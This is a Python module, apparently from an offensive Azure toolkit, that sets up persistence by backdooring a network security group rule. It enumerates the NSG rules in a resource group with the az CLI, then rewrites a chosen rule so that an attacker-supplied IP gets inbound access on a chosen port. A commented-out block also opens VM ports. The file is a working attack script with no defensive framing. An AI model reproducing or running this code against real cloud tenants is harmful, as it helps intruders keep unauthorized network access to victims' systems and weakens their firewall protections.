import subprocess
import json
import pprint

def start(args):

	help_str = "usage:\n\texec pers_backdoor_nsg_rule -rgrp resource-group---> will update an existing firewall rule"

	if(len(args)>0):
		if(args[0][0] == "?"):
			print(help_str)
			return
	if(len(args) == 0):
		print(help_str)
		return

	if "-rgrp" not in args[0]:
		print("need to provide resource group for this module")
		return


	if "-rgrp" in args[0]:

		print("[+] getting nsg rule names in specified resource group [+]")

		ind = args[0].index("-rgrp")
		resource_grp_name = args[0][ind+1]

		nsg_info = subprocess.run(['az', 'network', 'nsg', 'list', '-g', resource_grp_name, '--query', '[].{name:name, rule_name:securityRules[].name}'], stdout=subprocess.PIPE)
		nsg_info_json = json.loads(nsg_info.stdout.decode('utf-8'))

		for i in range(len(nsg_info_json)):
			print("nsg name: "+str(nsg_info_json[i]['name']))
			for j in range(len(nsg_info_json[i]['rule_name'])):
				print("nsg rule name: "+str(nsg_info_json[i]['rule_name'][j]))
			print("")

		update_rule(nsg_info_json, resource_grp_name)
		return



def update_rule(nsg_rules, resource_grp_name):

	nsg_name = input("\nwhich network security group would you like to target: ")
	nsg_rule_name = input("\nwhich nsg rule name would you like to target: ")

	'''
	if(rule_name not in nsg_rules):
		print("[-] not a valid choice [-]")
		return
	index = nsg_rules.index(rule_choice)
	'''
	
	src_ip = input("\nenter which IP you would like to give inbound access to: ")
	dest_port = input("\nenter which port you would like to open access to: ")
	priority = input("\nenter priority: ")


	nsg_cmd = subprocess.run(['az', 'network', 'nsg', 'rule', 'update', '-g', resource_grp_name, '--nsg-name', nsg_name, '--name', nsg_rule_name, \
		'--source-address-prefixes', src_ip, '--destination-port-ranges', dest_port, '--priority', priority], stdout=subprocess.PIPE)

	if nsg_cmd.returncode == 0:
		print("[+] backdoored nsg rule successfully [+]")

	'''	
	if "-rgrp" not in args[0] or "-vm_name" not in args[0] or "-ports" not in args[0]:
		print("incorrect cmd parameters")
		print(help_str)
		return

	grp_ind = args[0].index("-rgrp")
	rgrp = args[0][grp_ind+1]

	name_ind = args[0].index("-vm_name")
	vm_name = args[0][name_ind+1]

	ports_ind = args[0].index("-ports")
	ports = args[0][ports_ind+1]

	if("-" in ports):
		print("[+] opening ports ", ports, "[+]")
	else:
		print("[+] opening port ", port, "[+]")

	vm_list = subprocess.run(['az','vm', 'open-port', '-g', rgrp, '-n', vm_name, '--port', ports], stdout=subprocess.PIPE)
	vm_list_json = json.loads(vm_list.stdout.decode('utf-8'))

	print("[+] successfully opened [+]")

	'''

		

